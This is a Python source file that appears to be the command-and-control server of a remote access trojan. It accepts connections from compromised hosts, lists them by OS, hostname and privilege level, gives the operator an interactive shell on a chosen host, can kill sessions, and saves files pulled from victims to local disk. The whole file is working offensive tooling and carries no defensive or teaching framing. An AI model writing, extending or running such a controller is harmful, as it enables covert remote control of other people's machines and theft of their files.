import socket
import subprocess
import sys
import traceback

try:
    import tabulate
except ImportError:
    tabulate = None
    traceback.print_exc()

from common.util import logger, get_write_stream
from server.config import SOCKET_ADDR
from server.util import *
from common.ratsocket import RATSocket
from server.client import Client


class Server:

    def __init__(self, address):
        self.address = address
        self.socket = RATSocket()
        self.connections = []

    def serve(self):
        try:
            self.socket.bind(self.address)
            logger.info('Listening on port {}'.format(self.address[1]))
            self.socket.accept(self.connection_handler)
        except socket.error as e:
            logger.error(e)

    def connection_handler(self, conn, addr):
        conn.settimeout(5)
        try:
            connection = Client(conn)
            info = json.loads(connection.recv())
        except json.JSONDecodeError:
            conn.close()
            logger.error('Connection timed out: {}'.format(addr))
            return
        except Exception as e:
            logger.error('Error establishing connection: {}'.format(e))
            return
        conn.settimeout(None)
        info = {**{'addr': f'{addr[0]}:{addr[1]}'}, **info}
        connection = Client(conn, addr, info)
        self.connections.append(connection)
        logger.info('Connection has been established: {}'.format(addr))
        threading.Thread(target=recv, args=(connection,), daemon=True).start()


def cmdloop():
    while 1:
        try:
            cmd = colored_input('flc> ')
            if not cmd.strip():
                continue
            cmd_name, cmd_arg = parse(cmd)
            if cmd in ['l', 'list']:
                list_connections()
            elif cmd == 'q':
                open_connection(get_last_connection())
            elif cmd_name in ['s', 'select']:
                open_connection(get_target_connection(cmd_arg))
            elif cmd_name in ['k', 'kill']:
                kill_connection(cmd_arg)
            elif cmd in ['quit', 'exit']:
                server.socket.close()
                sys.exit(0)
            elif cmd in ['cls', 'clear']:
                subprocess.call(cmd, shell=True)
            elif cmd_name == 'cd':
                cd(cmd_arg)
            else:
                try:
                    open_connection(get_target_connection(cmd))
                except Exception:
                    raise Exception('Command not recognized')
        except KeyboardInterrupt:
            print(Colors.RESET)
            server.socket.close()
            sys.exit(0)
        except Exception as e:
            print_error(f'[-] {e}')
        finally:
            print()


def list_connections():
    connections = []
    for i, connection in enumerate(server.connections):
        connections.append([i, connection.info['addr'], connection.info['os'], connection.info['hostname'],
                            connection.info['integrity']])
    if tabulate:
        if connections:
            print(tabulate.tabulate(connections, headers=['ID', 'Address', 'OS', 'Hostname', 'Integrity'],
                                    tablefmt='pretty'))
    else:
        for connection in connections:
            print(connection)


def get_last_connection():
    try:
        return server.connections[len(server.connections) - 1]
    except IndexError:
        raise Exception('No connection at this time')


def get_target_connection(id):
    try:
        return server.connections[int(id)]
    except (ValueError, IndexError):
        raise Exception('Not a valid selection')


def kill_connection(id):
    conn = get_target_connection(id)
    if conn:
        conn.send_command('kill')


def open_connection(conn):
    Context.state = 'remote'
    Context.current_connection = conn
    Context.remote_commands = json.loads(conn.info['commands'])
    user_type = get_user_type(conn.info['integrity'])
    print('[+] Connected to {}'.format(conn.address))
    while 1:
        try:
            if Context.eof_event.is_set():
                cwd = conn.info['cwd']
                cmd = colored_input(
                    f'{cwd}{Colors.BRIGHT_GREEN}({user_type}){Colors.END}> ' if user_type else f'{cwd}> ')
                if not cmd.strip():
                    continue
                cmd_name, cmd_arg = parse(cmd)
                if cmd in ['kill', 'reset']:
                    Context.current_connection = None
                    conn.send_command(cmd)
                    break
                elif cmd in ['exit', 'quit']:
                    Context.current_connection = None
                    break
                elif cmd == 'q':
                    connection = get_last_connection()
                    if connection == conn:
                        continue
                    open_connection(connection)
                    break
                elif cmd_name in internal_commands:
                    cmd_id = internal_commands[cmd_name](cmd_arg, conn)
                    if cmd_id:
                        Context.last_command_id = cmd_id
                        Context.eof_event.clear()
                    continue
                elif cmd_name in AliasUtil.list():
                    cmd_id = send_alias(conn, cmd)
                    if cmd_id:
                        Context.last_command_id = cmd_id
                        Context.eof_event.clear()
                    continue
                Context.last_command_id = conn.send_command(cmd)
                Context.eof_event.clear()
        except socket.error:
            print_error('[-] Connection closed')
            break
        except KeyboardInterrupt:
            print(Colors.RESET)
            break
        except Exception as e:
            print_error(f'Error: {e}')
    Context.state = 'local'


def write(conn, status, result):
    if conn == Context.current_connection:
        if not status:
            result = Colors.BRIGHT_RED + result + Colors.RESET
        print(result)
    else:
        logger.info(f'Message from connection {conn.address}: {result}')


def recv(conn):
    while 1:
        try:
            head = conn.recv_head()
            id = head['id']
            type = head['type']
            eof = 0
            conn.info['cwd'] = head['cwd']
            result = None
            if type == 'result':
                result = head['status'], conn.recv_body(head)
                eof = head['eof']
            elif type == 'file':
                try:
                    filename = head['filename']
                    conn.recv_body(head, file_stream=get_write_stream(filename), update_progress=update_progress)
                    result = 1, '\nFile saved to: {}'.format(os.path.abspath(filename))
                except Exception as e:
                    result = 0, '\nError receiving file: {}'.format(e)
                eof = 1
            if result:
                write(conn, *result)
            if eof:
                if id == Context.last_command_id:
                    Context.eof_event.set()
                Context.last_command_id = None
        except socket.error:
            logger.error(f'Connection closed: {conn.address}')
            server.connections.remove(conn)
            break
        except Exception as e:
            print_error(f'Error receiving: {e}')


if __name__ == '__main__':
    os.system('')
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, daemon=True).start()
    cmdloop()
